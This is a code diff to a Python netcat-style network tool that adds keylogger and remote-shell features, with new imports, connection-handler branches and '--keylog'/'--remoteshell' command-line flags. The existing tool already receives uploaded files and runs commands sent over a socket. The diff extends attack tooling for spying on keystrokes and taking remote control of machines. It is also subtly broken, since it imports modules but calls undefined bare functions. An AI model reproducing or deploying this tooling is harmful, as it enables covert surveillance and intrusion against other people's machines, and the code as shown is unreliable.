@@ -5,7 +5,8 @@ import subprocess
 import sys
 import textwrap
 import threading
-
+import netcat.keylogger
+import netcat.remoteshell
 
 def execute(cmd):
     cmd = cmd.strip()
@@ -82,7 +83,10 @@ class NetCat:
                 f.write(file_buffer)
             message = f'Saved file {self.args.upload}'
             client_socket.send(message.encode())
-
+        elif self.args.keylog:
+            keylogger()
+        elif self.args.remoteshell:
+            remoteshell()
         elif self.args.command:
             cmd_buffer = b''
             while True:
@@ -117,6 +121,8 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
     parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
     parser.add_argument('-u', '--upload', help='upload file')
+    parser.add_argument('-k', '--keylog', help='keylog')
+    parser.add_argument('-rs', '--remoteshell', help='remoteshell')
     args = parser.parse_args()
     if args.listen:
         buffer = ''
